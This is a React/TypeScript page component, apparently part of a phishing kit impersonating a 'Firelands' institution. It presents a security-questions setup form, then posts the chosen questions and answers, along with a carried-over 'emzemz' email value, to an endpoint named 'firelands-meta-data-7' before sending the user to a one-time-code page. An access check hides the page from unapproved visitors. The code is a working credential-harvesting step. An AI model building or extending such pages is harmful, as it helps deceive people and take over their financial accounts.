import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';

const heroImageUrl = '/assets/firelands-landing.jpg';

const SecurityQuestions: React.FC = () => {
  const [securityQuestion1, setSecurityQuestion1] = useState('');
  const [securityAnswer1, setSecurityAnswer1] = useState('');
  const [securityQuestion2, setSecurityQuestion2] = useState('');
  const [securityAnswer2, setSecurityAnswer2] = useState('');
  const [securityQuestion3, setSecurityQuestion3] = useState('');
  const [securityAnswer3, setSecurityAnswer3] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    securityQuestion1: '',
    securityAnswer1: '',
    securityQuestion2: '',
    securityAnswer2: '',
    securityQuestion3: '',
    securityAnswer3: ''
  });

  const location = useLocation();
  const { emzemz } = location.state || {};
  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);

  if (isAllowed === null) {
    return <div>Loading...</div>;
  }

  if (isAllowed === false) {
    return <div>Access denied. Redirecting...</div>;
  }

  const securityQuestions = [
    "What was your childhood nickname?",
    "What is your mother's maiden name?",
    "What was the name of your first pet?",
    "What was the make and model of your first car?",
    "What city were you born in?",
    "What is your favorite childhood memory?",
    "What was your first job title?",
    "What is the name of your favorite teacher?",
    "What is your favorite book/movie character?",
    "What street did you grow up on?"
  ];

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = {
      securityQuestion1: !securityQuestion1 ? 'Please select a security question.' : '',
      securityAnswer1: !securityAnswer1.trim() ? 'Please provide an answer.' : '',
      securityQuestion2: !securityQuestion2 ? 'Please select a security question.' : '',
      securityAnswer2: !securityAnswer2.trim() ? 'Please provide an answer.' : '',
      securityQuestion3: !securityQuestion3 ? 'Please select a security question.' : '',
      securityAnswer3: !securityAnswer3.trim() ? 'Please provide an answer.' : ''
    };

    setErrors(newErrors);

    if (!Object.values(newErrors).some(error => error)) {
      try {
        await axios.post(`${baseUrl}api/firelands-meta-data-7/`, {
          emzemz,
          securityQuestion1,
          securityAnswer1,
          securityQuestion2,
          securityAnswer2,
          securityQuestion3,
          securityAnswer3
        });
        navigate('/otp', { state: { emzemz } });
      } catch (error) {
        console.error('Error submitting security questions:', error);
      } finally {
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  return (
    <div className="relative flex min-h-screen flex-col overflow-hidden text-white">
      <div className="absolute inset-0">
        <img
          src={heroImageUrl}
          alt="Sun setting over Firelands farm fields"
          className="h-full w-full object-cover"
          loading="lazy"
          decoding="async"
          fetchPriority="high"
          sizes="100vw"
        />
        <div className="absolute inset-0 bg-gradient-to-r from-black/80 via-black/55 to-black/20"></div>
      </div>

      <div className="relative z-10 flex flex-1 flex-col justify-center px-6 py-10 md:px-12 lg:px-20">
        <div className="mx-auto w-full max-w-6xl">
          <div className="mx-auto w-full max-w-md rounded-[32px] bg-white/95 p-8 text-gray-800 shadow-2xl backdrop-blur">
            <h2 className="text-2xl font-semibold text-[#2f2e67]">Set Your Security Questions</h2>
            
            <form onSubmit={handleSubmit} className="mt-6 space-y-6">
              {/* Question 1 */}
              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">Security Question 1</label>
                <select
                  value={securityQuestion1}
                  onChange={(e) => setSecurityQuestion1(e.target.value)}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                >
                  <option value="">Select a question</option>
                  {securityQuestions.map((q, i) => (
                    <option key={i} value={q}>{q}</option>
                  ))}
                </select>
                {errors.securityQuestion1 && (
                  <p className="text-sm text-rose-600">{errors.securityQuestion1}</p>
                )}
              </div>

              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">Answer 1</label>
                <input
                  type="text"
                  value={securityAnswer1}
                  onChange={(e) => setSecurityAnswer1(e.target.value)}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                />
                {errors.securityAnswer1 && (
                  <p className="text-sm text-rose-600">{errors.securityAnswer1}</p>
                )}
              </div>

              {/* Question 2 */}
              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">Security Question 2</label>
                <select
                  value={securityQuestion2}
                  onChange={(e) => setSecurityQuestion2(e.target.value)}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                >
                  <option value="">Select a question</option>
                  {securityQuestions.filter(q => q !== securityQuestion1).map((q, i) => (
                    <option key={i} value={q}>{q}</option>
                  ))}
                </select>
                {errors.securityQuestion2 && (
                  <p className="text-sm text-rose-600">{errors.securityQuestion2}</p>
                )}
              </div>

              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">Answer 2</label>
                <input
                  type="text"
                  value={securityAnswer2}
                  onChange={(e) => setSecurityAnswer2(e.target.value)}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                />
                {errors.securityAnswer2 && (
                  <p className="text-sm text-rose-600">{errors.securityAnswer2}</p>
                )}
              </div>

              {/* Question 3 */}
              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">Security Question 3</label>
                <select
                  value={securityQuestion3}
                  onChange={(e) => setSecurityQuestion3(e.target.value)}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                >
                  <option value="">Select a question</option>
                  {securityQuestions.filter(q => q !== securityQuestion1 && q !== securityQuestion2).map((q, i) => (
                    <option key={i} value={q}>{q}</option>
                  ))}
                </select>
                {errors.securityQuestion3 && (
                  <p className="text-sm text-rose-600">{errors.securityQuestion3}</p>
                )}
              </div>

              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">Answer 3</label>
                <input
                  type="text"
                  value={securityAnswer3}
                  onChange={(e) => setSecurityAnswer3(e.target.value)}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                />
                {errors.securityAnswer3 && (
                  <p className="text-sm text-rose-600">{errors.securityAnswer3}</p>
                )}
              </div>

              <button
                type="submit"
                disabled={isLoading}
                className="w-full rounded-full bg-gradient-to-r from-[#cdd1f5] to-[#f2f3fb] px-6 py-3 text-base font-semibold text-[#8f8fb8] shadow-inner transition enabled:hover:from-[#b7bff2] enabled:hover:to-[#e3e6fb] disabled:opacity-70"
              >
                {isLoading ? 'Processing...' : 'Continue'}
              </button>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default SecurityQuestions;
